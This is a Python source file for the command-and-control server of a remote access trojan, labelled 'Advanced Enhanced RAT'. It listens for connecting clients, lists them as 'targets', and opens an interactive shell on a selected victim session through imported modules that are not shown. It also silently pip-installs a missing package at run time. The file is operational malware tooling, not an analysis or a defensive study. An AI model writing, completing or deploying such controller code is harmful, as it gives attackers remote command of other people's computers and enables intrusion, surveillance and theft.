import threading
import time
import platform
import os
from modules.logging_config import setup_logging
from modules.communication import server_listen
from modules.client_management import list_sessions
from modules.command_handler import shell
try:
    from pystyle import Write, Colors, Colorate, Center, Box
except ImportError:
    print("[-] Installing pystyle...")
    import os
    os.system("pip install pystyle")
    from pystyle import Write, Colors, Colorate, Center, Box

# Initialize global variables
stop_threads = False
server_socket = None
banner_text = r"""
 ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓███████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░        
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓███████▓▒░  
Advanced Enhanced RAT
"""

# Setup logging
setup_logging()

if __name__ == "__main__":
    print(Colorate.Vertical(Colors.green_to_yellow, Center.XCenter(banner_text), 2))
    
    # Start server listening thread
    listen_thread = threading.Thread(target=server_listen, daemon=True)
    listen_thread.start()
    
    try:
        while not stop_threads:
            time.sleep(0.1)
            raw_main_cmd = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Server Command (Type 'help' for options): ", 2))
            main_cmd_parts = raw_main_cmd.strip().split(" ", 1)
            command = main_cmd_parts[0].lower()
            cmd_args = main_cmd_parts[1] if len(main_cmd_parts) > 1 else ""
            
            if command == "help":
                print(Colorate.Vertical(Colors.red_to_purple, """
**** SERVER COMMANDS MAIN MENU ****

  targets / sessions / list
      Description: Display all connected clients with details.
  session <ID>
      Description: Interact with a specific client session.
  cls / clear
      Description: Clear the server console screen.
  exit / quit
      Description: Terminate the server and disconnect all clients.

""", 2))
                continue
            elif command in ["targets", "sessions", "list"]:
                list_sessions()
            elif command == "session":
                if cmd_args.isdigit():
                    session_to_select = int(cmd_args)
                    shell(session_to_select)
                else:
                    print(f"{Colors.red}[-] Usage: session <ID>{Colors.reset}")
            elif command in ["cls", "clear"]:
                os.system("cls" if platform.system() == "Windows" else "clear")
                print(Colorate.Vertical(Colors.green_to_yellow, Center.XCenter(banner_text), 2))
            elif command in ["exit", "quit"]:
                print(f"{Colors.red}[*] Initiating server shutdown...{Colors.reset}")
                globals()['stop_threads'] = True
                break
            elif not command:
                continue
            else:
                print(f"{Colors.yellow}[?] Unknown command: '{command}'. Type 'help' for options.{Colors.reset}")
    except KeyboardInterrupt:
        print(f"\n{Colors.red}[*] Keyboard interrupt detected. Shutting down server...{Colors.reset}")
        globals()['stop_threads'] = True
    finally:
        print(f"{Colors.blue}[*] Closing server threads...{Colors.reset}")
        if server_socket:
            try:
                server_socket.close()
            except Exception as e:
                print(f"[-] Error closing server socket: {e}")
        if listen_thread.is_alive():
            listen_thread.join(timeout=5.0)
        print(f"[*] Server shutdown complete.")